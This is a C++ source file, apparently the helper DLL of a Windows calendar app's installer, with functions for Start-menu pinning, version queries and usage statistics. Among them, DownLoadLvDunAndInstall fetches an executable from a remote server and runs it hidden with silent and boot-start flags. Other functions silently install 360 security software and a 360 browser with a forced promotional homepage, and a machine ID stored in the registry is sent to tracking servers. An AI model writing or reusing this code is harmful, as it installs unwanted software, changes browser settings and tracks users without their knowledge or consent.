// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include "..\FRKernel\PeeIdHelper.h"
#include <string>
#include <atlbase.h>
#include <WTL/atlapp.h>
#include <Urlmon.h>
#pragma comment(lib, "Urlmon.lib")
#pragma comment(lib, "Version.lib")
#include "shlobj.h"
#include <shellapi.h>
#include <tlhelp32.h>
#include <atlstr.h>
#include "LRTPretender.h"
HINSTANCE gInstance = NULL;

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	gInstance = (HINSTANCE)hModule;
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

//程序退出保证所有子线程结束
static HANDLE s_ListenHandle = CreateEvent(NULL,TRUE,TRUE,NULL);
//引用计数,默认是0
static int s_ListenCount = 0;
static CRITICAL_SECTION s_csListen;
static bool b_Init = false;

void ResetUserHandle()
{
	if(!b_Init){
		InitializeCriticalSection(&s_csListen);
		b_Init = true;
	}
	EnterCriticalSection(&s_csListen);
	if(s_ListenCount == 0)
	{
		ResetEvent(s_ListenHandle);
	}
	++s_ListenCount; //引用计数加1
	TSDEBUG4CXX("ResetUserHandle  s_ListenCount = "<<s_ListenCount);
	LeaveCriticalSection(&s_csListen);
}

void SetUserHandle()
{
	EnterCriticalSection(&s_csListen);
	--s_ListenCount;//引用计数减1
	TSDEBUG4CXX("SetUserHandle  s_ListenCount = "<<s_ListenCount);
	if (s_ListenCount == 0)
	{
		SetEvent(s_ListenHandle);
	}
	LeaveCriticalSection(&s_csListen);
}

DWORD WINAPI SendHttpStatThread(LPVOID pParameter)
{
	//TSAUTO();
	CHAR szUrl[MAX_PATH] = {0};
	strcpy(szUrl,(LPCSTR)pParameter);
	delete [] pParameter;

	CHAR szBuffer[MAX_PATH] = {0};
	::CoInitialize(NULL);
	HRESULT hr = E_FAIL;
	__try
	{
		hr = ::URLDownloadToCacheFileA(NULL, szUrl, szBuffer, MAX_PATH, 0, NULL);
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		TSDEBUG4CXX("URLDownloadToCacheFile Exception !!!");
	}
	::CoUninitialize();
	SetUserHandle();
	return SUCCEEDED(hr)?ERROR_SUCCESS:0xFF;
}

 BOOL WStringToString(const std::wstring &wstr,std::string &str)
 {    
     int nLen = (int)wstr.length();    
     str.resize(nLen,' ');
 
     int nResult = WideCharToMultiByte(CP_ACP,0,(LPCWSTR)wstr.c_str(),nLen,(LPSTR)str.c_str(),nLen,NULL,NULL);
 
     if (nResult == 0)
     {
         return FALSE;
     }
 
     return TRUE;
 }

extern "C" __declspec(dllexport) void WaitForStat()
{
	DWORD ret = WaitForSingleObject(s_ListenHandle, 20000);
	if (ret == WAIT_TIMEOUT){
	}
	else if (ret == WAIT_OBJECT_0){	
	}
	if(b_Init){
		DeleteCriticalSection(&s_csListen);
	}
}

extern "C" __declspec(dllexport) void SetUpExit()
{
	TerminateProcess(GetCurrentProcess(), 0);
}

extern "C" __declspec(dllexport) void SendAnyHttpStat(CHAR *ec,CHAR *ea, CHAR *el,long ev)
{
	if (ec == NULL || ea == NULL)
	{
		return ;
	}
	TSAUTO();
	CHAR* szURL = new CHAR[MAX_PATH];
	memset(szURL, 0, MAX_PATH);
	char szPid[256] = {0};
	extern void GetPeerID(CHAR * pszPeerID);
	GetPeerID(szPid);
	std::string str = "";
	if (el != NULL )
	{
		str += "&el=";
		str += el;
	}
	if (ev != 0)
	{
		CHAR szev[MAX_PATH] = {0};
		sprintf(szev, "&ev=%ld",ev);
		str += szev;
	}
	sprintf(szURL, "http://www.google-analytics.com/collect?v=1&tid=UA-62827200-1&cid=%s&t=event&ec=%s&ea=%s%s",szPid,ec,ea,str.c_str());
	
	ResetUserHandle();
	DWORD dwThreadId = 0;
	HANDLE hThread = CreateThread(NULL, 0, SendHttpStatThread, (LPVOID)szURL,0, &dwThreadId);
	CloseHandle(hThread);
	//SendHttpStatThread((LPVOID)szURL);
}

extern "C" __declspec(dllexport)  HWND FindClockWindow()
{
	HWND hWnd = ::FindWindowEx(NULL, NULL, L"Shell_TrayWnd", NULL);
	if (::IsWindow(hWnd)) {
		hWnd = ::FindWindowEx(hWnd, 0, L"TrayNotifyWnd", NULL);
		if (::IsWindow(hWnd)) {
			hWnd = ::FindWindowEx(hWnd, 0, L"TrayClockWClass", NULL);
			if (::IsWindow(hWnd)) {
				return hWnd;
			}
		}
	}
	return NULL;
}

extern "C" __declspec(dllexport) void GetFileVersionString(CHAR* pszFileName, CHAR * pszVersionString)
{
	if(pszFileName == NULL || pszVersionString == NULL)
		return ;

	BOOL bResult = FALSE;
	DWORD dwHandle = 0;
	DWORD dwSize = ::GetFileVersionInfoSizeA(pszFileName, &dwHandle);
	if(dwSize > 0)
	{
		CHAR * pVersionInfo = new CHAR[dwSize+1];
		if(::GetFileVersionInfoA(pszFileName, dwHandle, dwSize, pVersionInfo))
		{
			VS_FIXEDFILEINFO * pvi;
			UINT uLength = 0;
			if(::VerQueryValueA(pVersionInfo, "\\", (void **)&pvi, &uLength))
			{
				sprintf(pszVersionString, "%d.%d.%d.%d",
					HIWORD(pvi->dwFileVersionMS), LOWORD(pvi->dwFileVersionMS),
					HIWORD(pvi->dwFileVersionLS), LOWORD(pvi->dwFileVersionLS));
				bResult = TRUE;
			}
		}
		delete pVersionInfo;
	}
}


extern "C" __declspec(dllexport) void GetPeerID(CHAR * pszPeerID)
{
	HKEY hKEY;
	LPCSTR data_Set= "Software\\DDCalendar";
	if (ERROR_SUCCESS == ::RegOpenKeyExA(HKEY_LOCAL_MACHINE,data_Set,0,KEY_READ,&hKEY))
	{
		char szValue[256] = {0};
		DWORD dwSize = sizeof(szValue);
		DWORD dwType = REG_SZ;
		if (::RegQueryValueExA(hKEY,"PeerId", 0, &dwType, (LPBYTE)szValue, &dwSize) == ERROR_SUCCESS)
		{
			strcpy(pszPeerID, szValue);
			return;
		}
		::RegCloseKey(hKEY);
	}
	std::wstring wstrPeerID;
	GetPeerId_(wstrPeerID);
	std::string strPeerID;
	WStringToString(wstrPeerID, strPeerID);
	strcpy(pszPeerID,strPeerID.c_str());

	HKEY hKey, hTempKey;
	if (ERROR_SUCCESS == ::RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software",0,KEY_SET_VALUE, &hKey))
	{
		if (ERROR_SUCCESS == ::RegCreateKeyA(hKey, "DDCalendar", &hTempKey))
		{
			::RegSetValueExA(hTempKey, "PeerId", 0, REG_SZ, (LPBYTE)pszPeerID, strlen(pszPeerID)+1);
		}
		RegCloseKey(hKey);
	}

}

extern "C" __declspec(dllexport) void NsisTSLOG(TCHAR* pszInfo)
{
	if(pszInfo == NULL)
		return;
	TSDEBUG4CXX("<NSIS> " << pszInfo);
}

extern "C" __declspec(dllexport) void GetTime(LPDWORD pnTime)
{
	TSAUTO();
	if(pnTime == NULL)
		return;
	time_t t;
	time( &t );
	*pnTime = (DWORD)t;
}

#ifndef DEFINE_KNOWN_FOLDER
#define DEFINE_KNOWN_FOLDER(name, l, w1, w2, b1, b2, b3, b4, b5, b6, b7, b8) \
	EXTERN_C const GUID DECLSPEC_SELECTANY name \
	= { l, w1, w2, { b1, b2,  b3,  b4,  b5,  b6,  b7,  b8 } }
#endif

#ifndef FOLDERID_Public
DEFINE_KNOWN_FOLDER(FOLDERID_Public, 0xDFDF76A2, 0xC82A, 0x4D63, 0x90, 0x6A, 0x56, 0x44, 0xAC, 0x45, 0x73, 0x85);
#endif

EXTERN_C const GUID DECLSPEC_SELECTANY FOLDERID_UserPin \
	= { 0x9E3995AB, 0x1F9C, 0x4F13, { 0xB8, 0x27,  0x48,  0xB2,  0x4B,  0x6C,  0x71,  0x74 } };


extern "C" typedef HRESULT (__stdcall *PSHGetKnownFolderPath)(  const  GUID& rfid, DWORD dwFlags, HANDLE hToken, PWSTR* pszPath);


extern "C" __declspec(dllexport) bool GetProfileFolder(char* szMainDir)	// 失败返回'\0'
{
	char szAllUserDir[MAX_PATH] = {0};
	if(('\0') == szAllUserDir[0])
	{
		HMODULE hModule = ::LoadLibraryA("shell32.dll");
		PSHGetKnownFolderPath SHGetKnownFolderPath = (PSHGetKnownFolderPath)GetProcAddress( hModule, "SHGetKnownFolderPath" );
		if ( SHGetKnownFolderPath)
		{
			PWSTR szPath = NULL;
			HRESULT hr = SHGetKnownFolderPath( FOLDERID_Public, 0, NULL, &szPath );
			if ( FAILED( hr ) ||  szPath == NULL)
			{
				TSERROR4CXX("Failed to get public folder");
				FreeLibrary(hModule);
				return false;
			}
			if(0 == WideCharToMultiByte(CP_ACP, 0, szPath, -1, szAllUserDir, MAX_PATH, NULL, NULL))
			{
				TSERROR4CXX("WideCharToMultiByte failed");
				return false;
			}
			::CoTaskMemFree( szPath );
			FreeLibrary(hModule);
		}
		else
		{
			HRESULT hr = SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, SHGFP_TYPE_CURRENT, szAllUserDir);
			if ( FAILED( hr ) )
			{
				TSERROR4CXX("Failed to get main pusher dir");
				return false;
			}
		}
	}
	strcpy(szMainDir, szAllUserDir);
	TSERROR4CXX("GetProfileFolder, szMainDir = "<<szMainDir);
	return true;
}


DWORD WINAPI DownLoadWork(LPVOID pParameter)
{
	//TSAUTO();
	CHAR szUrl[MAX_PATH] = {0};
	strcpy(szUrl,(LPCSTR)pParameter);

	CHAR szBuffer[MAX_PATH] = {0};
	DWORD len = GetTempPathA(MAX_PATH, szBuffer);
	if(len == 0)
	{
		return 0;
	}
	::PathCombineA(szBuffer,szBuffer,"GsSetup_0001.exe");
	::CoInitialize(NULL);
	HRESULT hr = E_FAIL;
	__try
	{
		hr = ::URLDownloadToFileA(NULL, szUrl, szBuffer, 0, NULL);
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		TSDEBUG4CXX("URLDownloadToCacheFile Exception !!!");
	}
	::CoUninitialize();
	if (SUCCEEDED(hr) && ::PathFileExistsA(szBuffer))
	{
		::ShellExecuteA(NULL,"open",szBuffer,"/s /run /setboot", NULL, SW_HIDE);
	}
	return SUCCEEDED(hr)?ERROR_SUCCESS:0xFF;
}

extern "C" __declspec(dllexport) void DownLoadLvDunAndInstall()
{
	TSAUTO();
	CHAR szUrl[] = "http://down.lvdun123.com/client/GsSetup_0001.exe";
	DWORD dwThreadId = 0;
	HANDLE hThread = CreateThread(NULL, 0, DownLoadWork, (LPVOID)szUrl,0, &dwThreadId);
	if (NULL != hThread)
	{
		DWORD dwRet = WaitForSingleObject(hThread, INFINITE);
		if (dwRet == WAIT_FAILED)
		{
			TSDEBUG4CXX("wait for DownLoa dBundled Software failed, error = " << ::GetLastError());
		}
		CloseHandle(hThread);
	}
	return;
}

extern "C" __declspec(dllexport) void Send2FlyRabbitAnyHttpStat(CHAR *op, CHAR *cid, CHAR *ver)
{
	if (op == NULL || cid == NULL)
	{
		return ;
	}
	TSAUTO();	
	char szPid[256] = {0};
	extern void GetPeerID(CHAR * pszPeerID);
	GetPeerID(szPid);
	/*szPid[12] = '\0';
	char szMac[128] = {0};
	for(int i = 0; i < (int)strlen(szPid); ++i)
	{
		if(i != 0 && i%2 == 0)
		{
			strcat(szMac, "-");
		}
		szMac[strlen(szMac)] = szPid[i];
	}*/
	std::string str = "http://stat.feitwo.com:8082/c?peerid=";
	str += szPid;
	str += "&appid=1001&proid=14";
	str += "&op=";
	str += op;
	str += "&cid=";
	str += cid;
	str += "&ver=";
	str += ver;
	CHAR* szURL = new CHAR[MAX_PATH];
	memset(szURL, 0, MAX_PATH);
	sprintf(szURL, "%s", str.c_str());
	//SendHttpStatThread((LPVOID)szURL);
	ResetUserHandle();
	DWORD dwThreadId = 0;
	HANDLE hThread = CreateThread(NULL, 0, SendHttpStatThread, (LPVOID)szURL,0, &dwThreadId);
	CloseHandle(hThread);
}

#include <vector>
#include <COMUTIL.H>
typedef std::vector<std::wstring> VectorVerbName;
VectorVerbName*  GetVerbNames(bool bPin)
{
	TSAUTO();
	static bool bInit = false;
	static std::vector<std::wstring> vecPinStartMenuNames;
	static std::vector<std::wstring> vecUnPinStartMenuNames;
	if (!bInit )
	{	
		bInit = true;
		vecPinStartMenuNames.push_back(_T("锁定到开始菜单"));vecPinStartMenuNames.push_back(_T("附到「开始」菜单"));
		vecUnPinStartMenuNames.push_back(_T("从「开始」菜单脱离"));vecUnPinStartMenuNames.push_back(_T("(从「开始」菜单解锁"));
	}

	return bPin? &vecPinStartMenuNames : &vecUnPinStartMenuNames;
}

bool VerbNameMatch(TCHAR* tszName, bool bPin)
{
	TSAUTO();
	VectorVerbName *pVec = GetVerbNames(bPin);
	
	VectorVerbName::iterator iter = pVec->begin();
	VectorVerbName::iterator iter_end = pVec->end();
	while(iter!=iter_end)
	{
		std::wstring strName= *iter;
		if ( 0 == _wcsnicmp(tszName,strName.c_str(),strName.length()))
			return true;
		iter ++;
	}
	return false;
}

wchar_t* AnsiToUnicode( const char* szStr )
{
	int nLen = MultiByteToWideChar( CP_ACP, MB_PRECOMPOSED, szStr, -1, NULL, 0 );
	if (nLen == 0)
	{
		return NULL;
	}
	wchar_t* pResult = new wchar_t[nLen];
	MultiByteToWideChar( CP_ACP, MB_PRECOMPOSED, szStr, -1, pResult, nLen );
	return pResult;
}

#define IF_FAILED_OR_NULL_BREAK(rv,ptr) \
{if (FAILED(rv) || ptr == NULL) break;}

#define SAFE_RELEASE(p) { if(p) { (p)->Release(); (p)=NULL; } }
extern "C" __declspec(dllexport) bool PinToStartMenu4XP(bool bPin, char* szPath)
{
	TSAUTO();

	TCHAR file_dir[MAX_PATH + 1] = {0};
	TCHAR *file_name;
	wchar_t* pwstr_Path = AnsiToUnicode(szPath);
	if(pwstr_Path == NULL){
		return false;
	}

	wcscpy_s(file_dir,MAX_PATH,pwstr_Path);
	PathRemoveFileSpecW(file_dir);
	file_name = PathFindFileName(pwstr_Path);
	::CoInitialize(NULL);
	CComPtr<IShellDispatch> pShellDisp;
	CComPtr<Folder> folder_ptr;
	CComPtr<FolderItem> folder_item_ptr;
	CComPtr<FolderItemVerbs> folder_item_verbs_ptr;


	HRESULT rv = CoCreateInstance( CLSID_Shell, NULL, CLSCTX_SERVER,IID_IDispatch, (LPVOID *) &pShellDisp );
	do 
	{
		IF_FAILED_OR_NULL_BREAK(rv,pShellDisp);
		rv = pShellDisp->NameSpace(_variant_t(file_dir),&folder_ptr);
		IF_FAILED_OR_NULL_BREAK(rv,folder_ptr);
		rv = folder_ptr->ParseName(CComBSTR(file_name),&folder_item_ptr);
		IF_FAILED_OR_NULL_BREAK(rv,folder_item_ptr);
		rv = folder_item_ptr->Verbs(&folder_item_verbs_ptr);
		IF_FAILED_OR_NULL_BREAK(rv,folder_item_verbs_ptr);
		long count = 0;
		folder_item_verbs_ptr->get_Count(&count);
		for (long i = 0; i < count ; ++i)
		{
			FolderItemVerb* item_verb = NULL;
			rv = folder_item_verbs_ptr->Item(_variant_t(i),&item_verb);
			if (SUCCEEDED(rv) && item_verb)
			{
				CComBSTR bstrName;
				item_verb->get_Name(&bstrName);

				if ( VerbNameMatch(bstrName,bPin) )
				{
					TSDEBUG4CXX("Find Verb to Pin:"<< bstrName);
					int i = 0;
					do
					{
						rv = item_verb->DoIt();
						TSDEBUG4CXX("Try Do Verb. NO." << i+1 << ", return="<<rv);
						if (SUCCEEDED(rv))
						{
							::SHChangeNotify(SHCNE_UPDATEDIR|SHCNE_INTERRUPT|SHCNE_ASSOCCHANGED, SHCNF_IDLIST |SHCNF_FLUSH | SHCNF_PATH|SHCNE_ASSOCCHANGED,
								pwstr_Path,0);
							Sleep(500);
							delete [] pwstr_Path;
							::CoUninitialize();
							return true;
						}else
						{
							Sleep(500);
							rv = item_verb->DoIt();
						}
					}while ( i++ < 3);
						
					break;
				}
			}
		}
	} while (0);
	delete [] pwstr_Path;
	::CoUninitialize();
	return false;
}


extern "C" __declspec(dllexport) void RefleshIcon(char* szPath)
{
	wchar_t* pwstr_Path = AnsiToUnicode(szPath);
	::SHChangeNotify(SHCNE_UPDATEDIR|SHCNE_INTERRUPT|SHCNE_ASSOCCHANGED, SHCNF_IDLIST |SHCNF_FLUSH | SHCNF_PATH|SHCNE_ASSOCCHANGED,
								pwstr_Path,0);
	delete [] pwstr_Path;

}

extern "C" __declspec(dllexport) void GetUserPinPath(char* szPath)
{
	static std::wstring strUserPinPath(_T(""));

	if (strUserPinPath.length() <= 0)
	{
		HMODULE hModule = LoadLibrary( _T("shell32.dll") );
		if ( hModule == NULL )
		{
			return;
		}
		PSHGetKnownFolderPath SHGetKnownFolderPath = (PSHGetKnownFolderPath)GetProcAddress( hModule, "SHGetKnownFolderPath" );
		if (SHGetKnownFolderPath)
		{
			PWSTR pszPath = NULL;
			HRESULT hr = SHGetKnownFolderPath(FOLDERID_UserPin, 0, NULL, &pszPath );
			if (SUCCEEDED(hr))
			{
				TSDEBUG4CXX("UserPin Path: " << pszPath);
				strUserPinPath = pszPath;
				::CoTaskMemFree(pszPath);
			}
		}
		FreeLibrary(hModule);
	}
	int nLen = (int)strUserPinPath.length();    
    int nResult = WideCharToMultiByte(CP_ACP,0,(LPCWSTR)strUserPinPath.c_str(),nLen,szPath,nLen,NULL,NULL);
}

bool IsVistaOrLatter()
{
	OSVERSIONINFOEX osvi = { sizeof(OSVERSIONINFOEX) };
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	if(!GetVersionEx( (LPOSVERSIONINFO)&osvi ))
	{
		osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
		if(!GetVersionEx( (LPOSVERSIONINFO)&osvi ))
		{
		}
	}
	return (osvi.dwMajorVersion >= 6);
}

static HRESULT SendHttpStatSync(const std::string& url)
{
	CoInitialize(NULL);
	CHAR szBuffer[MAX_PATH];
	HRESULT hr = E_FAIL;
	__try
	{
		hr = ::URLDownloadToCacheFileA(NULL, url.c_str(), szBuffer, MAX_PATH, 0, NULL);
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
	}
	CoUninitialize();
	return hr;
}

// ec: 360safeinstall or 360browserinstall
// ea: 版本
// el: 渠道
static HRESULT Send360ProductInstallHttpStatSync(const std::string& ec, const std::string& ea, const std::string& el)
{
	std::string url = "http://www.google-analytics.com/collect?v=1&tid=UA-58424540-1&cid=";
	char szPid[256];
	std::memset(szPid, 0, sizeof(szPid));
	GetPeerID(szPid);
	url += szPid;
	url += "&t=event&ec=";
	url += ec;
	url += "&ea=";
	url += ea;
	url += "&el=";
	url += el;
	url += "&ev=1";
	return SendHttpStatSync(url);
}

static DWORD Do360SafeLogic(DWORD dwPublicID, LPCSTR lpszLibraryFile)
{
	TSINFO4CXX("Do360SafeLogic ENTER ");
	DWORD dwResult = (DWORD)-1;
	typedef BOOL (WINAPI *ISSAFEEXIST)();
	HINSTANCE hInstance = LoadLibraryA(lpszLibraryFile);
	ISSAFEEXIST IsSafeExist = (ISSAFEEXIST)GetProcAddress(hInstance,"IsSafeExist");
	if (IsSafeExist)
	{
		BOOL isSafeExist = IsSafeExist();
		TSINFO4CXX("IsSafeExist: " << isSafeExist);
		if(FALSE == isSafeExist)
		{
			typedef struct _StartParameter
			{
				int ver;
				int id;     //分配给您的渠道号
				BOOL sync;
				BOOL httprecord;
				DWORD timeout;
				WCHAR cab_name[MAX_PATH + 1];
			} StartParameter;

			if (hInstance)
			{
				TSINFO4CXX("Do360SafeLogic: CALL Start");
				typedef DWORD (WINAPI *PFNStart)(StartParameter *param);
				PFNStart   pFnStart = (PFNStart)GetProcAddress(hInstance, "Start") ; //Start_UI是有托盘图标的
				if (pFnStart)
				{
					StartParameter param;
					std::memset(&param, 0, sizeof(StartParameter));
					param.ver = 3;
					param.id = dwPublicID;    //只需要修改这个分配给您的渠道号就可以了. 其他参数不用改
					param.sync = TRUE;
					param.httprecord = TRUE;
					param.timeout = 1000*60*60*30;
					dwResult = pFnStart(&param);
				}
			}
		}
	}
	return dwResult;
}

static HRESULT DoBrowserLogic(DWORD dwPublicID, LPCSTR lpszLibraryFile, LPCWSTR lpszCommandLine = NULL)
{
    TSINFO4CXX("DoBrowserLogic ENTER ");
	//////////////////////////////////////////////////////////////////////////
    // 浏览器推广相关导出函数 [10/31/2014 Beacon]
    //////////////////////////////////////////////////////////////////////////
    // 浏览器全自动下载安装发射装置 [11/5/2014 Beacon]
    //   参数一 : [IN] 推广者ID
    //   参数二 : [IN, OPT] 传给安装包的命令行
    //   返回值 : 安装结果
    typedef HRESULT(WINAPI * TBrowserLaunch)(DWORD dwPubicID, LPCWSTR lpszCommandLine);

    // 判断360SE 或 360Chrome 是否安装 [11/5/2014 Beacon]
    //   参数一 : [IN] 测试 360SE 是否安装
    //   参数二 : [IN] 测试 360Chrome 是否安装
    //   返回值 : 所测试的浏览器是否已安装(参数一与参数二是或的关系)
    typedef BOOL(WINAPI * TIsBrowserInstalled)(BOOL b360Se, BOOL b360Chrome);
    //////////////////////////////////////////////////////////////////////////

    HRESULT hr = E_FAIL;
    HMODULE hModule = NULL;
    __try{
        hModule = LoadLibraryA(lpszLibraryFile);
        if (hModule == NULL) __leave;

        TIsBrowserInstalled IsBrowserInstalled = (TIsBrowserInstalled) GetProcAddress(hModule, "IsBrowserInstalled");
        TBrowserLaunch BrowserLaunch = (TBrowserLaunch) GetProcAddress(hModule, "BrowserLaunch");
        if (IsBrowserInstalled == NULL || BrowserLaunch == NULL){
            hr = E_NOINTERFACE;
            __leave;
        }

        // 判断是否安装了360安全浏览器或360极速浏览器,只有两者都没安装,才推广 [11/11/2014 Beacon]
		BOOL isBrowserInstalled = IsBrowserInstalled(TRUE, TRUE);
		TSINFO4CXX("IsBrowserInstalled: " << isBrowserInstalled);
        if (!isBrowserInstalled)
        {
            // 下载并安装推广的浏览器 [11/11/2014 Beacon]
            // 调用该接口,只有返回值 SUCCEEDED(hr) 才成功 [11/11/2014 Beacon]
            hr = BrowserLaunch(dwPublicID, lpszCommandLine);
            if (FAILED(hr)) __leave;
        }

    }
    __finally{
        if (hModule) FreeLibrary(hModule);
    }
    return hr;
}

struct Install360ProductThreadParameters {
	int product; // 0: 360safe, 1: 360 browser
	CHAR libraryFile[MAX_PATH];
	CHAR ea[32];
	CHAR el[32];
};

DWORD WINAPI Intall360ProductThread(LPVOID pParameter)
{
	 TSINFO4CXX("Intall360ProductThread ENTER ");
	const Install360ProductThreadParameters* args = reinterpret_cast<const Install360ProductThreadParameters*>(pParameter);
	if (args->product == 0) {
		if (0 == Do360SafeLogic(21456, args->libraryFile)) {
			Send360ProductInstallHttpStatSync("360safeinstall", args->ea, args->el);
		}
	}
	else {
		// args->product == 1
		if (S_OK == DoBrowserLogic(21456, args->libraryFile, L"--silent-install=3_1_1 --homepage=http://hao.360.cn/?src=lm&ls=n798f3c1297")) {
			Send360ProductInstallHttpStatSync("360browserinstall", args->ea, args->el);
		}
	}
	delete args;
	SetUserHandle();
	return 0;
}

extern "C" __declspec(dllexport) VOID Install360SafeAsync(LPCSTR lpszLibraryFile, LPCSTR ea, LPCSTR el)
{
	TSINFO4CXX("Intall360ProductThread lpszLibraryFile =  "<<lpszLibraryFile<<", ea = "<<ea<<", el = "<<el);
	if (std::strlen(lpszLibraryFile) >= MAX_PATH ||
		std::strlen(ea) >= 32 || std::strlen(el) >= 32) {
		return;
	}
	Install360ProductThreadParameters* parg = new Install360ProductThreadParameters();
	std::memset(parg, 0, sizeof(Install360ProductThreadParameters));
	parg->product = 0;
	std::strcpy(parg->libraryFile, lpszLibraryFile);
	std::strcpy(parg->ea, ea);
	std::strcpy(parg->el, el);
	ResetUserHandle();
	HANDLE hThread = CreateThread(NULL, 0, Intall360ProductThread, (LPVOID)parg, 0, NULL);
	CloseHandle(hThread);
}

extern "C" __declspec(dllexport) VOID Install360BrowserAsync(LPCSTR lpszLibraryFile, LPCSTR ea, LPCSTR el)
{
	if (std::strlen(lpszLibraryFile) >= MAX_PATH ||
		std::strlen(ea) >= 32 || std::strlen(el) >= 32) {
		return;
	}
	Install360ProductThreadParameters* parg = new Install360ProductThreadParameters();
	std::memset(parg, 0, sizeof(Install360ProductThreadParameters));
	parg->product = 1;
	std::strcpy(parg->libraryFile, lpszLibraryFile);
	std::strcpy(parg->ea, ea);
	std::strcpy(parg->el, el);
	ResetUserHandle();
	HANDLE hThread = CreateThread(NULL, 0, Intall360ProductThread, (LPVOID)parg, 0, NULL);
	CloseHandle(hThread);
}

CAppModule _Module;

extern "C" __declspec(dllexport) void LoadLuaRunTime(char* szInstallDir,char* szParam)
{
	TSTRACEAUTO();
	HRESULT hr = ::CoInitialize(NULL);
	hr = _Module.Init(NULL, gInstance);


	CMessageLoop theLoop;
	_Module.AddMessageLoop(&theLoop);

	CLRTAgent lrtAgent;
	if (lrtAgent.InitLua(szInstallDir,szParam))
	{
		TSDEBUG4CXX(_T(">>>>>theLoop.Run()"));
		theLoop.Run();
		TSDEBUG4CXX(_T("<<<<<theLoop.Run()"));
	}
	_Module.RemoveMessageLoop();
	_Module.Term();
	::CoUninitialize();
	TerminateProcess(::GetCurrentProcess(), S_OK);

	return;
}

extern "C" __declspec(dllexport) void DeleteFileEx(const char* strPath)
{
	::DeleteFileA(strPath);
	DWORD dwLastError = ::GetLastError();
	TSDEBUG4CXX("DeleteFileEx "<<strPath<<", lasterror = "<<dwLastError);
}

extern "C" __declspec(dllexport) void Pin2StartMenuWin7(const char* strPath, bool bPin)
{
	if(PathFileExistsA(strPath)){
		::ShellExecuteA(NULL, "startunpin", strPath, NULL, NULL, SW_HIDE);
		DWORD dwLastError = ::GetLastError();
		TSDEBUG4CXX("Pin2StartMenuWin7, startunpin ok, lasterror = "<<dwLastError);
		Sleep(1000);
		if(PathFileExistsA(strPath)){
			DeleteFileEx(strPath);
		}
	} else {
		TSDEBUG4CXX("Pin2StartMenuWin7, strPath is not exist, strPath = "<<strPath);
	}
	if(bPin){
			
	}
}

extern "C" __declspec(dllexport) void Pin2TaskbarWin7(const char* strPath, bool bPin)
{
	if(PathFileExistsA(strPath)){
		::ShellExecuteA(NULL, "taskbarunpin", strPath, NULL, NULL, SW_HIDE);
		DWORD dwLastError = ::GetLastError();
		TSDEBUG4CXX("Pin2TaskbarWin7, startunpin ok, lasterror = "<<dwLastError);
		wchar_t* wstrPath = AnsiToUnicode(strPath);
		::SHChangeNotify(SHCNE_UPDATEDIR|SHCNE_INTERRUPT|SHCNE_ASSOCCHANGED, SHCNF_FLUSH | SHCNF_PATH|SHCNE_ASSOCCHANGED,
						wstrPath,0);
		delete [] wstrPath;
		Sleep(500);
		if(PathFileExistsA(strPath)){
			DeleteFileEx(strPath);
		}
	} else {
		TSDEBUG4CXX("Pin2TaskbarWin7, strPath is not exist, strPath = "<<strPath);
	}
	if(bPin){
			
	}
}